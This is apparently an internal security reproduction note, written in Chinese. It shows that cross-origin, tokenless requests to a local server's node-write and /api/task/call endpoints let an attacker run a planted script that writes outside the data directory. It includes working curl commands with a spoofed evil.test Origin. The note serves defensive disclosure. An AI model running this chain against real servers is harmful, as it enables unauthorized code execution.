# `/api/task/call` 端到端复现（2026-10-19）

验证文档第十四、十七节的核心结论：**跨源、无令牌，只要先改节点数据写上 `uiScripts`，就能让后台执行脚本，脚本能写到数据目录之外。**

已实跑通过，输出：

```
0 list                          → 200 {"ok":true,"scripts":[{"name":"demo",...}]}
1 缺 nodeId                      → 403
2 缺 methods（shapeOk=false）      → 400（runScript 自己拒绝，没绕过）
3 nodeId 不存在                   → 403
4 args 不是数组                    → 400（同上）
5 args 是数字 + 无 nodeId          → 400（同上）
---
先用 PUT /api/canvases/default 写入节点 n1（data.uiScripts={demo:{}}）
POST /api/task/call {name:'demo', methods:'echo', nodeId:'n1', wait:true} → 200，返回 echo 结果
---
放入 evil.mjs（写 .scratch/OUTSIDE-taskprobe.txt），把 n1 的声明改成 {evil:{}}
POST /api/task/call {name:'evil', methods:'pwn', nodeId:'n1', wait:true} → 200
越界文件存在: true
```

## 怎么复现

```bash
# 1. 准备一个临时数据目录：后台插件 + 任务脚本
mkdir -p .scratch/taskprobe/server-plugins .scratch/taskprobe/task-scripts
cp packages/plugins/plugin-node-ui/dist/server.js .scratch/taskprobe/server-plugins/node-ui.js
cp packages/plugins/plugin-node-ui/task-scripts/demo.mjs .scratch/taskprobe/task-scripts/

# 2. 起服务
node packages/cloud-server/dist/cli.js serve -p 8946 -d ./.scratch/taskprobe --no-open --no-mcp

# 3. 打探针（先只跑 list/403/400 那几条）
BASE=http://127.0.0.1:8946 node .scratch/header-probe/run20-task-call.mjs

# 4. 写入带声明的节点，再执行（这一步会真的写文件）
curl -X PUT http://127.0.0.1:8946/api/canvases/default \
  -H 'content-type: application/json' \
  -d '{"nodes":[{"id":"n1","type":"ui","position":{"x":0,"y":0},"data":{"uiScripts":{"demo":{}}}}],"edges":[]}'

curl -X POST http://127.0.0.1:8946/api/task/call \
  -H 'content-type: application/json' -H 'Origin: http://evil.test:9999' \
  -d '{"type":"call","name":"demo","methods":"echo","args":["hi"],"canvasId":"default","nodeId":"n1","wait":true}'
```

跑完删掉 `.scratch/taskprobe/` 与被写的越界文件。

## 结论的意义

1. `authorizeScriptCall` 只看「节点数据里有没有声明这个脚本名」，而**节点数据可以通过跨源简单请求改**（第一节实测）；
2. 所以「先改节点、再调脚本」是一条完整链，令牌必须同时盖住**节点写**与 `/api/task/call`；
3. 授权检查本身没有形状绕过口子（缺 methods / args 非数组都在 `runScript` 处被拒），这一点比代码看起来要好。
